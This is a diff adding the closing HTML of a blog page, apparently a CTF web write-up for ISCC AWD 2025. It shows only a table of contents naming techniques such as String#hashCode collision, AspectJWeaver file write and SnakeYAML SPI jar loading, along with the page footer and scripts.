+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-AWD-2025-CTF"><span class="toc-text">ISCC_AWD(2025) CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A"><span class="toc-text">考点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#String-hashCode-%E7%A2%B0%E6%92%9E"><span class="toc-text">String#hashCode 碰撞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AspectJWeaver%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99"><span class="toc-text">AspectJWeaver任意文件写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Snakeyaml-SPI-%E5%8A%A0%E8%BD%BD%E6%9C%AC%E5%9C%B0%E6%81%B6%E6%84%8Fjar"><span class="toc-text">Snakeyaml SPI 加载本地恶意jar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + ISCC_AWD_%E5%86%B3%E8%B5%9B(2025)%20Web%20writeup + '&url=' + http%3A%2F%2Fkagty1.github.io%2Fctf_posts%2FISCC_AWD(2025)%2520CTF.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/ctf_posts/ISCC_AWD(2025)%20CTF.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
